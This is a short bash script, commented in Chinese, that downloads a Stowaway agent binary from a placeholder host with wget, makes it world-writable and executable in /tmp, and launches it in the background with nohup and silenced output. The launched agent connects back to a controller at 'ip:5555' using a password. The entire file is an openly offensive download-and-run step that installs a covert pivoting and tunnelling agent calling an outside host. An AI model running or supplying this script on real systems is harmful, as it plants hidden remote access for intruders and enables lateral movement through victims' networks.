#!/bin/bash
# 下载stowaway agent，并执行
wget http://ip:8888/linux_x64_agent -O /tmp/linux_x64_agent
chmod 777 /tmp/linux_x64_agent
nohup /tmp/linux_x64_agent -c ip:5555 -s password 2>/dev/null 1>/dev/null &
